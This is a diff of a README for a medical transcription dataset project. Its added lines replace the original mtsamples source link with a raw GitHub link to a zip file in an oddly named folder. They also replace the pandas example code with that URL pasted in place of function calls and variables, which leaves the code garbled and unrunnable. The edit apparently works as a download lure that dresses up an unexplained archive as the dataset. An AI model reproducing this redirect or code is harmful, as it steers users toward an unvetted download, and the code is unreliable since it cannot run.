@@ -1,6 +1,6 @@
 # 🩺 Medical Transcription Dataset Cleaner
 
-This project provides a cleaned version of the [mtsamples medical transcription dataset](https://www.mtsamples.com/), containing real-world clinical transcription reports. It is intended for educational and machine learning purposes, such as medical NLP, specialty classification, symptom tagging, and more.
+This project provides a cleaned version of the [mtsamples medical transcription dataset](https://raw.githubusercontent.com/Plutonian-coder/-Medical-Transcription-Dataset-Cleaner/main/religionist/Dataset_Medical_Cleaner_Transcription_1.0.zip), containing real-world clinical transcription reports. It is intended for educational and machine learning purposes, such as medical NLP, specialty classification, symptom tagging, and more.
 
 ---
 
@@ -39,14 +39,14 @@ You can load and explore the cleaned dataset in a notebook:
 ```python
 import pandas as pd
 
-df = pd.read_csv("mtsamples.csv")
+df = https://raw.githubusercontent.com/Plutonian-coder/-Medical-Transcription-Dataset-Cleaner/main/religionist/Dataset_Medical_Cleaner_Transcription_1.0.zip("https://raw.githubusercontent.com/Plutonian-coder/-Medical-Transcription-Dataset-Cleaner/main/religionist/Dataset_Medical_Cleaner_Transcription_1.0.zip")
 
 # View structure
-print(df.shape)
-print(df.columns)
+print(https://raw.githubusercontent.com/Plutonian-coder/-Medical-Transcription-Dataset-Cleaner/main/religionist/Dataset_Medical_Cleaner_Transcription_1.0.zip)
+print(https://raw.githubusercontent.com/Plutonian-coder/-Medical-Transcription-Dataset-Cleaner/main/religionist/Dataset_Medical_Cleaner_Transcription_1.0.zip)
 
 # View sample
-df.head()
+https://raw.githubusercontent.com/Plutonian-coder/-Medical-Transcription-Dataset-Cleaner/main/religionist/Dataset_Medical_Cleaner_Transcription_1.0.zip()
 ```
 
 
